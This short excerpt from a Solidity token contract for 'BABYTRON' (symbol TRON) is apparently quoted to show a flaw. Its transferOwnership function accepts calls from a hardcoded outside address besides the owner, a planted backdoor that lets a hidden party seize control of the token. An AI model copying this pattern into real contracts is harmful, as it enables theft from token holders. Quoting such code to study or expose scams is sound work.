...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0x78543eE7c8880896347d49b75698cdE59b4d75fb));
...
contract BABYTRON is Context, IERC20, Ownable, Pausable {
  ...
  uint256 private _totalSupply = 125*10**15*10**5;
  string private _symbol = "TRON";
  string private _name = "BABYTRON";
